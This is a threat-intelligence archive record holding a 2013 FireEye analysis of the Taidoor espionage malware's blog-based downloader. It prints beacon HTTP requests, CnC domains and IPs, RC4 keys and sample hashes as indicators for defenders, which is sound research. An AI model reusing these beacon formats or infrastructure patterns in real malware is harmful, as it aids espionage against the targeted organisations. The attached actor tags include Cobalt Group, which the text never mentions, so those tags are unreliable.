{
    "id": "83946840-698e-42f2-8fbc-919440a2f2ed",
    "created_at": "2023-01-12T15:04:11.047904Z",
    "updated_at": "2025-03-27T02:13:58.880236Z",
    "deleted_at": null,
    "sha1_hash": "1c4fff2e36204882930b281ded29f3c0693f611e",
    "title": "2013-09-06 - Evasive Tactics- Taidoor",
    "authors": "",
    "file_creation_date": "2022-05-29T01:12:43Z",
    "file_modification_date": "2022-05-29T01:12:43Z",
    "file_size": 116761,
    "plain_text": "# Evasive Tactics: Taidoor\n\n**[fireeye.com/blog/threat-research/2013/09/evasive-tactics-taidoor-3.html](https://www.fireeye.com/blog/threat-research/2013/09/evasive-tactics-taidoor-3.html)**\n\nThreat Research\n\nNart Villeneuve, Thoufique Haq, Ned Moran\n\nSep 06, 2013\n\n5 mins read\n\nMalware\n\nTTPs\n\nThe Taidoor malware has been used in many ongoing cyber espionage campaigns. Its victims\ninclude government agencies, corporate entities, and think tanks, especially those with interests in\nTaiwan. [1] In a typical attack, targets receive a [spear-phishing email which encourages them to open](https://www.fireeye.com/resources/top-words-used-in-spear-phishing-attacks)\nan attached file. If opened on a vulnerable system, malware is silently installed on the target’s\ncomputer while a decoy document with legitimate content is opened that is intended to alleviate any\nsuspicions the target may have. Taidoor has been successfully compromising targets since 2008,\nand continues to be active today.\n\n\n-----\n\nDespite being around for a long time – and quite well known – Taidoor is a constantly evolving,\npersistent threat. We observed significant tactical changes in 2011 and 2012, when the malicious\nemail attachments did not drop the Taidoor malware directly, but instead dropped a “downloader” that\nthen grabbed the traditional Taidoor malware from the Internet. [2]\n\nRecently, we observed a new variant of Taidoor, which was used in targeted attacks. It has evolved in\ntwo ways. Instead of downloading the traditional Taidoor malware from a command-and-control\n(CnC) server, the “downloader” reaches out to Yahoo Blogs and retrieves encrypted text from blog\nposts. When decrypted by the “downloader”, this text is actually a modified version of the traditional\nTaidoor malware. This new version of Taidoor maintains similar behavior, but has been changed\nenough to avoid common network detection signatures.\n\n**Traditional Taidoor Malware**\n\nThe Taidoor malware is traditionally delivered as an email attachment. If opened, the Taidoor\nmalware is dropped onto the target’s system, and starts to beacon to a CnC server. Taidoor connects\nto its CnCs using HTTP, and the “GET” request has been consistent since 2008. It follows a simple\npattern:\n\n```\nGET /[5 characters].php?id=[6 numbers][12 characters/numbers]\n\n```\n\nThe last set of 12 characters is actually the encrypted MAC address of the compromised computer.\nThe values of the MAC address are incremented by 1, and this is used as an RC4 key to encrypt the\ndata that is passed between the compromised computer and its CnC server.\n\n**The New Taidoor**\n\nIn the past, other APT campaigns have used blog hosting platforms as a mechanism to transmit CnC\nserver information to compromised targets. [3] Attackers using Taidoor have leveraged this model as\nwell.\n\nWe analyzed a sample (be1d972819e0c5bf80bf1691cc563400) that when opened exploits a\nvulnerability in Microsoft Office (CVE-2012-0158) to drop malware on the target’s computer.\n\n\n-----\n\ntaidoor 1\n\n\nThe decoy document contains background information on trade liberalization between the People’s\nRepublic of China (PRC) and Taiwan.\n\nThe various strings in the file are XOR-encoded with the key \"0x02\" or \"0x03\".\n\n\n-----\n\ntaidoor 2\n\n\nThis malware is a simple “downloader” that, instead of connecting to a CnC server, connects to a\nYahoo Blog and downloads the contents of a blog post.\n\n```\nGET /jw!JRkdqkKGAh6MPj9MlwbK6iMgScE- HTTP/1.1\n\n```\n```\nAccept: /\n\n```\n```\nAccept-Language: en-us\n\n```\n```\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET\nCLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; InfoPath.2)\n\n```\n```\nAccept-Encoding: gzip, deflate\n\n```\n```\nHost: tw.myblog.yahoo.com\n\n```\n```\nConnection: Keep-Alive\n\n```\n\n-----\n\ntaidoor 3\n\n\nThe content of the blog post between the markers “ctxugfbyyxyyyxyy” and “yxyyyxyyctxugfby” is\nencoded with base64 and encrypted using the RC4 cipher. The encryption key, which we discovered\nto be \"asdfasdf\", is also present in the contents of the base64 blog data in an encrypted form. The\ndecrypted content of the blog post is a DLL file – that is in fact the Taidoor malware.\n\n\n-----\n\ntaidoor 4\n\n\nAfter the first-stage dropper downloads and decrypts the Taidoor malware, it then begins to connect\nto two CnC servers: roudan.serveftp.com (69.95.218.31) and mac.gov.hpc.tw (120.50.40.145).\nHowever, the network traffic (its “callback”) has been modified from the traditional version.\n\n```\nGET /default.jsp?vx=vsutnh191138F9744C HTTP/1.1\n\n```\n```\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET\nCLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\n\n```\n```\nHost: mac.gov.hpc.tw:443\n\n```\n```\nConnection: Keep-Alive\n\n```\n```\nCache-Control: no-cache\n\n```\n\nRather than having “[five characters].php”, this new file path ends in “.jsp” and may have any of the\nfollowing file names:\n\n\n-----\n\nprocess\npage\ndefault\nindex\nuser\nparse\nabout\nsecurity\nquery\nlogin\n\nThe new format is:\n```\n/[file name].jsp?[2 random characters]=[6 random characters][encrypted MAC\naddress]\n\n```\nIn addition to the use of other malicious Word documents (b0fd4d5fb6d8acb1ccfb54d53c08f11f), we\nhave also seen this new Taidoor variant distributed as a Windows ScreenSaver file (.scr) posing as a\nPDF (d9940a3da42eb2bb8e19a84235d86e91) or a Word document\n(c4de3fea790f8ff6452016db5d7aa33f).\n\n\ntaidoor 5a\n\n\n-----\n\ntaidoor5b\n\n\ntaidoor5c\n\n\nIt remains unclear whether all of this Taidoor activity is related or different groups are using the same\nmalware for different purposes. The fact that Taidoor is not off-the-shelf malware that can simply be\ndownloaded or purchased in the cybercrime underground suggests that all of this activity may be\nconnected in some way.\n\n\n-----\n\ntaidoor clusters\n\n\nSo far, we have found only one large cluster of activity associated with this new Taidoor variant. This\ncluster, which made use of Yahoo Blogs, appears to have targeted entities in Taiwan. We found that\ntraditional versions of Taidoor have also been using this infrastructure. [4]\n\n_Malware Connections_\n\nWe found that another, possibly related, malware family known as “Taleret” is using the same\ntechnique that this Taidoor variant has used. We found that samples (such as\n6cd1bf0e8adcc7208b82e1506efdba8d, 525fd346b9511a84bbe26eb47b845d89 and\n5c887a31fb4713e17c5dda9d78aab9fe) connect to Yahoo Blogs in order to retrieve a list of CnC\nservers.\n\n\n-----\n\ntaidoor9\n\n\nThe content between the two markers “XXXXX” is encoded with base64 and encrypted with the RC4\ncipher. The encryption key is “c37f12a0” in hex, and hardcoded in the malware.\n\n\n-----\n\ntaidoor10\n\n\nWe extracted the following CnC servers from these blog posts:\n\nopp.gov.taiwans.tw\nnscnet.gov.medicare.tw\nmac.gov.skies.tw\nklserver.servehttp.com\nkllserver.serveftp.com\n202.142.153.154\n80.149.239.139\n202.142.172.131\nwww.facebook.trickip.NET\nwww.braintrust.AlmostMy.COM\n\nAs with Taidoor, there appears to be a frequent association with Taiwan, in addition to a similar CnC\nnaming scheme – such as mac.gov.hpc.tw (Taidoor) and mac.gov.skies.tw (Taleret).\n\n\n-----\n\n**Conclusion**\n\nThe Taidoor malware has been used to successfully compromise targets since 2008. This threat has\nevolved over time, and has recently leveraged Yahoo Blogs as a mechanism to drop the Taidoor\nmalware as a “second stage” component. In addition, the well-known Taidoor network traffic pattern\nhas been modified, likely as a new way to avoid network-based detection.\n\n**Notes**\n\n1.\nhttp://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/trojan_taidoortargeting_think_tanks.pdf\n\n2. http://blog.trendmicro.com/trendlabs-security-intelligence/taidoor-update-taidoor-gang-tags-itsvictims/ and http://aboutthreats.trendmicro.com/us/spam/222/A%20Malware%20Treat%20this%20Halloween\n\n3. http://www.nartv.org/mirror/shadows-in-the-cloud.pdf and reports of associated malware here\nhttp://www.welivesecurity.com/2013/05/23/syndicasec-in-the-sin-bin/ and here\nhttp://www.cybersquared.com/apt_targetedattacks_within_socialmedia/\n\n4. MD5 hashes of traditional Taidoor samples 811aae1a66f6a2722849333293cbf9cd\n454c9960e89d02e4922245efb8ef6b49 5efc35315e87fdc67dada06fb700a8c7\nbc69a262bcd418d194ce2aac7da47286\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2013/2013-09-06 - Evasive Tactics- Taidoor.pdf"
    ],
    "report_names": [
        "2013-09-06 - Evasive Tactics- Taidoor.pdf"
    ],
    "threat_actors": [
        {
            "id": "71b19e59-b5f7-4bc6-816d-194be0f02af0",
            "created_at": "2022-10-25T16:07:24.301036Z",
            "updated_at": "2025-03-27T02:02:10.165121Z",
            "deleted_at": null,
            "main_name": "Taidoor",
            "aliases": [
                "Budminer",
                "Earth Aughisky"
            ],
            "source_name": "ETDA:Taidoor",
            "tools": [
                "Dripion",
                "Masson",
                "Taidoor",
                "simbot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2dfaa730-7079-494c-b2f0-3ff8f3598a51",
            "created_at": "2022-10-25T16:07:23.474746Z",
            "updated_at": "2025-03-27T02:02:09.822683Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "ATK 67",
                "Cobalt Gang",
                "Cobalt Spider",
                "Gold Kingswood",
                "Mule Libra",
                "TAG-CR3"
            ],
            "source_name": "ETDA:Cobalt Group",
            "tools": [
                "ATMRipper",
                "ATMSpitter",
                "Agentemis",
                "AmmyyRAT",
                "AtNow",
                "COOLPANTS",
                "CobInt",
                "Cobalt Strike",
                "CobaltStrike",
                "Cyst Downloader",
                "Fareit",
                "FlawedAmmyy",
                "Formbook",
                "Little Pig",
                "Metasploit Stager",
                "Mimikatz",
                "More_eggs",
                "NSIS",
                "Nullsoft Scriptable Install System",
                "Pony Loader",
                "Ripper ATM",
                "SDelete",
                "Siplog",
                "SoftPerfect Network Scanner",
                "SpicyOmelette",
                "Taurus Builder",
                "Taurus Builder Kit",
                "Taurus Loader",
                "Terra Loader",
                "ThreatKit",
                "VenomKit",
                "cobeacon",
                "win.xloader"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "50bd4a6c-7542-4bdd-8b37-ab468fc428ef",
            "created_at": "2023-01-06T13:46:38.998658Z",
            "updated_at": "2025-03-27T02:00:02.973354Z",
            "deleted_at": null,
            "main_name": "Taidoor",
            "aliases": [
                "G0015",
                "Earth Aughisky"
            ],
            "source_name": "MISPGALAXY:Taidoor",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "478e9b27-39b9-49e4-a3c5-81569a767275",
            "created_at": "2022-10-25T15:50:23.417339Z",
            "updated_at": "2025-03-27T02:00:55.464624Z",
            "deleted_at": null,
            "main_name": "Taidoor",
            "aliases": [
                "Taidoor"
            ],
            "source_name": "MITRE:Taidoor",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c11abba0-f5e8-4017-a4ee-acb1a7c8c242",
            "created_at": "2022-10-25T15:50:23.744036Z",
            "updated_at": "2025-03-27T02:00:55.537114Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "Cobalt Group",
                "GOLD KINGSWOOD",
                "Cobalt Gang",
                "Cobalt Spider"
            ],
            "source_name": "MITRE:Cobalt Group",
            "tools": [
                "Mimikatz",
                "More_eggs",
                "SpicyOmelette",
                "SDelete",
                "Cobalt Strike",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535851,
    "ts_updated_at": 1743041638,
    "ts_creation_date": 1653786763,
    "ts_modification_date": 1653786763,
    "files": {
        "pdf": "https://archive.orkl.eu/1c4fff2e36204882930b281ded29f3c0693f611e.pdf",
        "text": "https://archive.orkl.eu/1c4fff2e36204882930b281ded29f3c0693f611e.txt",
        "img": "https://archive.orkl.eu/1c4fff2e36204882930b281ded29f3c0693f611e.jpg"
    }
}